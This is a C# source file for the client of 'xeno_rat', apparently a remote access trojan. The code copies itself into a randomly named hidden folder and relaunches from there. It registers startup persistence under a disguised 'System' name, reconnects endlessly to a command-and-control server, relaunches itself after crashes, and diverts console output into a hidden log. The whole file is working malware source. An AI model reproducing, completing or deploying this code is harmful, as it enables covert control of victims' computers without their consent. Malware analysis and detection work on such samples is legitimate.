using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Security.Cryptography;

namespace xeno_rat_client
{
    class Program
    {
        private static Node Server;
        private static ModuleManager ModuleManager = new ModuleManager();
        private static string ServerIp = "localhost";
        private static int ServerPort = 1234;
        private static byte[] securityKey = new byte[32] { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 };
        private static int delay = 1000;
        private static string serviceIdentifier = "123";
        private static int DoStartup = 2222;
        private static string Install_path = "nothingset";
        private static string startup_name = "nothingset";

        public static StringBuilder ProcessLog = new StringBuilder();

        static async Task Main(string[] args)
        {
            try
            {
                await InitializeEnvironment();
                await StartMainLoop();
            }
            catch
            {
                await Task.Delay(delay);
                Process.Start(Assembly.GetEntryAssembly().Location);
                Environment.Exit(0);
            }
        }

        private static async Task InitializeEnvironment()
        {
            CapturingConsoleWriter ConsoleCapture = new CapturingConsoleWriter(Console.Out);
            Console.SetOut(ConsoleCapture);
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;

            string currentMutex = serviceIdentifier + (Utils.IsElevated() ? "-admin" : "");
            using (Mutex mutex = new Mutex(true, currentMutex, out bool createdNew))
            {
                if (!createdNew) Environment.Exit(0);

                if (Install_path != "nothingset")
                {
                    await InstallSelf();
                }

                await Task.Delay(delay);

                if (DoStartup == 1)
                {
                    await SetupStartup();
                }
            }
        }

        private static async Task InstallSelf()
        {
            try
            {
                string dir = Environment.ExpandEnvironmentVariables($"%{Install_path}%\\{GetRandomString(8)}\\");
                if (Directory.GetCurrentDirectory() != dir)
                {
                    string self = Assembly.GetEntryAssembly().Location;
                    if (!Directory.Exists(dir))
                    {
                        Directory.CreateDirectory(dir);
                    }
                    File.Copy(self, dir + Path.GetFileName(self));
                    Process.Start(dir + Path.GetFileName(self));
                    Environment.Exit(0);
                }
            }
            catch { }
        }

        private static string GetRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random();
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static async Task SetupStartup()
        {
            if (startup_name == "nothingset")
            {
                startup_name = "System" + GetRandomString(8);
            }
            if (Utils.IsElevated())
            {
                await Utils.RegisterServiceAdmin(Assembly.GetEntryAssembly().Location, startup_name);
            }
            else
            {
                await Utils.RegisterServiceNonAdmin(Assembly.GetEntryAssembly().Location, startup_name);
            }
        }

        private static async Task StartMainLoop()
        {
            while (true)
            {
                try
                {
                    using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                    {
                        await socket.ConnectAsync(ServerIp, ServerPort);
                        Server = await Utils.ConnectAndSetupAsync(socket, securityKey, 0, 0, HandleServiceStop);
                        Handler handle = new Handler(Server, ModuleManager);
                        await handle.HandleMainConnection();
                    }
                }
                catch (Exception e)
                {
                    await Task.Delay(10000);
                }
            }
        }

        public static void HandleServiceStop(Node MainNode)
        {
            // Silence connection logs
        }

        static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            try
            {
                if (Server != null)
                {
                    foreach (Node i in Server.serviceConnections)
                    {
                        if (i.connectionType == 1)
                        {
                            i.SendAsync(NetworkManager.Concat(new byte[] { 3 },
                                Encoding.UTF8.GetBytes("Service restart required"))).Wait();
                            Thread.Sleep(1000);
                        }
                    }
                }
            }
            catch { }
            Process.Start(Assembly.GetEntryAssembly().Location);
            Environment.Exit(0);
        }
    }

    public class CapturingConsoleWriter : TextWriter
    {
        private readonly TextWriter originalOut;
        public CapturingConsoleWriter(TextWriter originalOut) => this.originalOut = originalOut;
        public override Encoding Encoding => originalOut.Encoding;
        public override void Write(char value) => Program.ProcessLog.Append(value);
        public override void WriteLine(string value) => Program.ProcessLog.AppendLine(value);
        public string GetCapturedOutput() => Program.ProcessLog.ToString();
        public void ClearCapturedOutput() => Program.ProcessLog.Clear();
    }
}
